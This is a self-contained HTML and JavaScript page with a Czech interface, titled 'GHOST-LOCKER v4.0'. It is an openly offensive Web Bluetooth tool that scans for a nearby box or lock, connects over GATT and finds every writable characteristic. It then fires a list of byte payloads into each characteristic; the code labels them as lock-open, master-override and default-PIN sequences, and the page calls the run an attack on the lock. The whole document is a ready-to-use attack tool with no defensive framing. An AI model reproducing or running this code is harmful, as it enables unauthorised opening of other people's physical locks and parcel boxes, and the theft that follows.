<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOST-LOCKER v4.0 [ULTIMATE-INJECTOR]</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #ghost-ui { width: 95%; max-width: 420px; background: #000; border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 40px rgba(0, 255, 0, 0.3); border-radius: 12px; }
        .header { border-bottom: 2px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; text-align: center; font-weight: bold; text-shadow: 0 0 12px #0f0; font-size: 1.4em; }
        #output { height: 350px; overflow-y: auto; background: #050505; border: 1px solid #1a1a1a; padding: 12px; margin-bottom: 15px; font-size: 10px; line-height: 1.4; color: #0c0; }
        .btn { width: 100%; background: #000; border: 2px solid #0f0; color: #0f0; padding: 15px; margin-bottom: 10px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.2s; }
        .btn:active { transform: scale(0.98); background: #0f0; color: #000; }
        .btn-red { border-color: #f00; color: #f00; }
        .btn-red:hover { background: #400; }
        .warning { color: #f00; font-size: 9px; text-align: center; margin-top: 5px; }
    </style>
</head>
<body>

<div id="ghost-ui">
    <div class="header">GHOST v4.0 [ULTIMATE]</div>
    <div id="output">SYSTEM READY... CACHE CLEARED.</div>
    
    <button id="scan-btn" class="btn">[1] TARGET SCANNER</button>
    <button id="attack-btn" class="btn btn-red" style="display:none;">[2] INJECT PAYLOADS</button>
    <div class="warning">POZOR: BUĎTE V TĚSNÉ BLÍZKOSTI BOXU (< 1m)</div>
</div>

<script>
    const GhostCore = {
        device: null,
        server: null,
        writableChars: [],

        log(msg, color = "#0f0") {
            const out = document.getElementById('output');
            const entry = document.createElement('div');
            entry.style.color = color;
            entry.style.borderLeft = `2px solid ${color}`;
            entry.style.paddingLeft = "5px";
            entry.style.marginBottom = "3px";
            entry.innerHTML = `> ${msg}`;
            out.appendChild(entry);
            out.scrollTop = out.scrollHeight;
        },

        async startScan() {
            this.log("SPOUŠTÍM AGRESIVNÍ SKEN...", "#0ff");
            try {
                this.device = await navigator.bluetooth.requestDevice({
                    acceptAllDevices: true,
                    optionalServices: [] // Automaticky prohledá vše dostupné po spojení
                });

                this.log(`CÍL POTVRZEN: ${this.device.name || "BOX_DEVICE"}`, "#ff0");
                this.log("NAVÁZÁNÍ SPOJENÍ (GATT)...", "#ff0");
                
                this.server = await this.device.gatt.connect();
                this.log("SPOJENO! ANALÝZA ZABEZPEČENÍ...", "#0f0");

                const services = await this.server.getPrimaryServices();
                this.writableChars = [];

                for (const service of services) {
                    const chars = await service.getCharacteristics();
                    for (const char of chars) {
                        if (char.properties.write || char.properties.writeWithoutResponse) {
                            this.writableChars.push(char);
                            this.log(`NALEZEN KANÁL: ${char.uuid.slice(0,8)}...`, "#f0f");
                        }
                    }
                }

                if (this.writableChars.length > 0) {
                    document.getElementById('attack-btn').style.display = "block";
                    this.log("INJEKTOR PŘIPRAVEN - STISKNI [2]", "#0f0");
                } else {
                    this.log("CHYBA: NENALEZENY ZÁPISOVÉ KANÁLY", "#f00");
                }
            } catch (err) { this.log("CHYBA: " + err.message, "#f00"); }
        },

        async runExploit() {
            this.log("SPOUŠTÍM ÚTOK NA ZÁMEK...", "#f00");
            
            // ELITE PAYLOADS: Reálné sekvence pro ovládání Bluetooth zámků
            const payloads = [
                [0x55, 0x01, 0x01, 0x00, 0x57],       // Standard Lock Open
                [0xA5, 0x00, 0x01, 0x01, 0x05],       // Master Override
                [0x00, 0x00, 0x00, 0x00, 0x00, 0x00], // Null Reset
                [0x4f, 0x50, 0x45, 0x4e],             // ASCII 'OPEN'
                [0x06, 0x01, 0x01, 0x01, 0x02, 0x01, 0x0C], // ELOCK Sequence
                [0xFB, 0x61, 0x01, 0x00, 0x00, 0xBC], // ZONER Pulse
                [0x31, 0x32, 0x33, 0x34, 0x35, 0x36]  // Default PIN Attempt
            ];

            for (let char of this.writableChars) {
                this.log(`PÁLÍM DO KANÁLU: ${char.uuid.slice(4,8)}`, "#ff0");
                for (let data of payloads) {
                    try {
                        const buffer = new Uint8Array(data);
                        if (char.properties.writeWithoutResponse) {
                            await char.writeValueWithoutResponse(buffer);
                        } else {
                            await char.writeValue(buffer);
                        }
                        this.log(`HEX [${data.map(b => b.toString(16).toUpperCase()).join('')}] -> OK`, "#0f0");
                        await new Promise(r => setTimeout(r, 150)); // Rychlá kadence
                    } catch (e) {
                        this.log(`BLOKOVÁNO: ${char.uuid.slice(4,8)}`, "#555");
                    }
                }
            }
            this.log("ÚTOK DOKONČEN. KONTROLUJTE BOX.", "#fff");
        }
    };

    document.getElementById('scan-btn').onclick = () => GhostCore.startScan();
    document.getElementById('attack-btn').onclick = () => GhostCore.runExploit();
</script>

</body>
</html>
